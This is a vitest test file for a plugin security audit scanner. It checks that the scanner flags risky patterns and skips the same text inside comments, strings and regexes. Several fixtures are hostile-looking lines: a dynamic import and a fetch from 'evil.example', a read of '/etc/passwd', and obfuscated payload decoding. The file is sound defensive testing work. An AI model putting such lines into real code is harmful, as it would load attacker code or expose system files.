import { describe, it, expect, afterEach } from 'vitest'
import { scanPluginCode } from '../../src/node/security/audit/scanner'
import { makePlugin, cleanupPlugin } from './test-utils'

const cleanups: string[] = []
afterEach(() => {
  const dir = cleanups.pop()
  if (dir) cleanupPlugin(dir)
})

function scan(files: Record<string, string>, maxTotalBytes?: number) {
  const dir = makePlugin(files)
  cleanups.push(dir)
  return scanPluginCode(dir, { name: 'fixture' }, { maxTotalBytes })
}

function ruleIds(result: { findings: { ruleId: string; line: number }[] }) {
  return result.findings.map((f) => f.ruleId)
}

describe('audit scanner precision', () => {
  it('does not flag comments, strings or templates', () => {
    const result = scan({
      'index.js': [
        "// fetch('https://comment.example')",
        "/* execSync('ls') */",
        'const a = \'spawn("ls")\'',
        "const b = `eval('code')`",
        'const c = "axios"',
      ].join('\n'),
    })
    expect(ruleIds(result)).toEqual([])
  })

  it('keeps strings intact when stripping comments (URL regression)', () => {
    const result = scan({
      'index.js': [
        'const url = "https://example.com/api?q=1"',
        'fetch(url)',
      ].join('\n'),
    })
    expect(ruleIds(result)).toContain('fetch-call')
    expect(ruleIds(result)).not.toContain('child-process-exec')
  })

  it('reports file:line evidence', () => {
    const result = scan({
      'src/a.js': ['const ok = 1', 'fetch("/api")', 'const after = 2'].join(
        '\n',
      ),
    })
    const fetchFinding = result.findings.find((f) => f.ruleId === 'fetch-call')
    expect(fetchFinding).toBeDefined()
    expect(fetchFinding?.file).toBe('src/a.js')
    expect(fetchFinding?.line).toBe(2)
    expect(fetchFinding?.snippet).toBe('fetch("/api")')
  })

  it('detects child_process imports and normalizes node: prefix', () => {
    const result = scan({
      'index.js': [
        "const cp = require('child_process')",
        "import { exec } from 'node:child_process'",
      ].join('\n'),
    })
    expect(
      ruleIds(result).filter((id) => id === 'import-child-process'),
    ).toHaveLength(2)
  })

  it('flags remote dynamic imports as high risk', () => {
    const result = scan({
      'index.js': "const m = await import('https://evil.example/x.js')",
    })
    const finding = result.findings.find(
      (f) => f.ruleId === 'remote-code-import',
    )
    expect(finding?.severity).toBe('high')
  })

  it('detects obfuscation patterns', () => {
    const result = scan({
      'index.js': [
        'const s = "\\x66\\x65\\x74\\x63\\x68\\x28"',
        'const c = String.fromCharCode(97, 98)',
        "const p = Buffer.from(payload, 'base64')",
        "const d = atob('dmFyIHg9MQ==')",
      ].join('\n'),
    })
    expect(ruleIds(result)).toEqual(
      expect.arrayContaining([
        'hex-escape-run',
        'string-fromcharcode',
        'base64-buffer',
        'atob-btoa',
      ]),
    )
    expect(
      result.findings.find((f) => f.ruleId === 'hex-escape-run')?.severity,
    ).toBe('high')
  })

  it('flags secret-like environment variable access', () => {
    const result = scan({
      'index.js': [
        "const a = process.env['API_SECRET']",
        'const b = process.env.TOKEN',
        'const c = process.env.NODE_ENV',
      ].join('\n'),
    })
    expect(ruleIds(result)).toEqual(
      expect.arrayContaining(['env-secret-name', 'env-secret-dot']),
    )
    // plain env reads are only informational (low)
    expect(ruleIds(result)).toContain('env-access')
  })

  it('flags sensitive fs writes and reads, not benign ones', () => {
    const result = scan({
      'index.js': [
        "const a = fs.writeFileSync(os.homedir() + '/x', data)",
        "const b = fs.readFileSync('/etc/passwd')",
        "const c = fs.readFileSync(path.join(__dirname, 'data.json'))",
      ].join('\n'),
    })
    expect(ruleIds(result)).toContain('fs-write')
    expect(ruleIds(result)).toContain('fs-write-sensitive')
    expect(ruleIds(result)).toContain('fs-read-sensitive')
    // the benign read (data.json in __dirname) produces no finding
    expect(
      result.findings.filter((f) => f.ruleId === 'fs-read-sensitive'),
    ).toHaveLength(1)
    expect(result.findings.some((f) => f.snippet?.includes('data.json'))).toBe(
      false,
    )
  })

  it('does not flag regex literals', () => {
    const result = scan({
      'index.js': 'const re = /fetch\\(/g',
    })
    expect(ruleIds(result)).not.toContain('fetch-call')
  })

  it('handles block comments spanning lines', () => {
    const result = scan({
      'index.js': [
        '/*',
        " * fetch('https://x')",
        ' */',
        'const ok = true',
      ].join('\n'),
    })
    expect(ruleIds(result)).toEqual([])
  })

  it('handles template literals spanning lines', () => {
    const result = scan({
      'index.js': [
        "const t = `exec('ls')",
        'second line`',
        'const ok = 1',
      ].join('\n'),
    })
    expect(ruleIds(result)).not.toContain('child-process-exec')
  })

  it('does not flag require/import patterns embedded in strings', () => {
    const result = scan({
      'index.js': [
        'const hint = "require(\'child_process\')"',
        "const tpl = `import('https://evil.example/x.js')`",
      ].join('\n'),
    })
    expect(ruleIds(result)).not.toContain('import-child-process')
    expect(ruleIds(result)).not.toContain('remote-code-import')
  })

  it('does not flag secret/base64/fs patterns embedded in strings', () => {
    const result = scan({
      'index.js': [
        'const a = "process.env[\'API_SECRET\']"',
        'const b = "Buffer.from(x, \'base64\')"',
        'const c = "fs.writeFileSync(\'/tmp/x\')"',
      ].join('\n'),
    })
    expect(ruleIds(result)).not.toContain('env-secret-name')
    expect(ruleIds(result)).not.toContain('base64-buffer')
    expect(ruleIds(result)).not.toContain('fs-write')
  })

  it('still flags the same patterns when they are real code', () => {
    const result = scan({
      'index.js': [
        "require('child_process')",
        "process.env['API_SECRET']",
        "Buffer.from(x, 'base64')",
      ].join('\n'),
    })
    expect(ruleIds(result)).toEqual(
      expect.arrayContaining([
        'import-child-process',
        'env-secret-name',
        'base64-buffer',
      ]),
    )
  })

  describe('adversarial edge cases', () => {
    it('treats division operators as code, not regex literals', () => {
      const result = scan({
        'index.js': [
          'const ratio = total / count / 2',
          'const step = (a + b) / 2',
        ].join('\n'),
      })
      expect(ruleIds(result)).toEqual([])
    })

    it('blanks regex literals even when they contain suspicious text', () => {
      const result = scan({
        'index.js': 'const re = /fetch\\(|exec\\(/g; const ok = 1',
      })
      expect(ruleIds(result)).toEqual([])
    })

    it('reports new Function( exactly once', () => {
      const result = scan({
        'index.js': "const f = new Function('return this')",
      })
      const ids = ruleIds(result)
      expect(ids).toContain('new-function')
      expect(ids).not.toContain('function-constructor')
    })

    it('captures import specifiers across inline comments', () => {
      const result = scan({
        'index.js': "const cp = require(/* resolve */ 'child_process')",
      })
      expect(ruleIds(result)).toContain('import-child-process')
    })

    it('does not leak findings out of template interpolations', () => {
      const result = scan({
        'index.js': [
          'const url = `https://api.example.com/v1`',
          // biome-ignore lint/suspicious/noTemplateCurlyInString: intentional template-interpolation fixture
          "const msg = `token=${process.env['API_SECRET']}`",
        ].join('\n'),
      })
      expect(ruleIds(result)).toEqual([])
    })

    it('keeps block comments from leaking into following code', () => {
      const result = scan({
        'index.js': ['/*', "fetch('https://x')", '*/', "fetch('/real')"].join(
          '\n',
        ),
      })
      const fetchFindings = result.findings.filter(
        (f) => f.ruleId === 'fetch-call',
      )
      expect(fetchFindings).toHaveLength(1)
      expect(fetchFindings[0].line).toBe(4)
    })
  })

  describe('total size cap', () => {
    it('emits scan-truncated when the byte budget is exhausted', () => {
      const big = 'export const s = '.repeat(50_000) // ~1MB of benign code
      const result = scan(
        {
          'a.js': big,
          'b.js': "fetch('https://evil.example/x')",
        },
        1024 * 64, // 64KB cap -> only the head of a.js is scanned
      )
      expect(ruleIds(result)).toContain('scan-truncated')
      expect(result.filesScanned).toBe(1)
      // b.js was never reached
      expect(result.findings.some((f) => f.ruleId === 'fetch-call')).toBe(false)
    })

    it('scans the head of the file that crosses the cap', () => {
      // Suspicious code at the very top, padding below the cap boundary.
      const padded = "fetch('/api/x')\n" + 'export const x = 1\n'.repeat(20_000)
      const result = scan({ 'index.js': padded }, 512)
      expect(ruleIds(result)).toContain('fetch-call')
      expect(ruleIds(result)).toContain('scan-truncated')
    })

    it('does not truncate when the budget fits', () => {
      const result = scan({ 'index.js': 'const ok = 1\n' }, 1024 * 1024)
      expect(ruleIds(result)).not.toContain('scan-truncated')
    })

    it('never reports a truncated scan as clean (fail-closed)', () => {
      const big = 'export const s = 1\n'.repeat(50_000)
      const result = scan(
        {
          'index.js': big,
          'package.json': JSON.stringify({ name: 'trunc-plugin' }),
        },
        1024,
      )
      expect(ruleIds(result)).toContain('scan-truncated')
      // a scan-truncated finding means the report is never 'clean'
      expect(result.findings.length).toBeGreaterThan(0)
    })
  })

  it('flags destructured fs imports (no fs. alias on the call site)', () => {
    const result = scan({
      'index.js': [
        "import { writeFileSync } from 'node:fs'",
        "writeFileSync('/tmp/x', data)",
      ].join('\n'),
    })
    // The bare writeFileSync() call is invisible to the alias-based fs-write
    // rule; the import finding is what surfaces the filesystem capability.
    expect(ruleIds(result)).toContain('import-fs')
    expect(ruleIds(result)).not.toContain('fs-write')
  })

  it('detects direct child_process call sites', () => {
    const result = scan({
      'index.js': [
        'child_process.execSync("ls")',
        'execSync("ls")',
        'spawn("npm", ["install"])',
        'eval("2+2")',
        'new Function("return this")()',
      ].join('\n'),
    })
    expect(ruleIds(result)).toEqual(
      expect.arrayContaining([
        'child-process-call',
        'child-process-exec',
        'child-process-spawn',
        'eval-call',
        'new-function',
      ]),
    )
  })
})
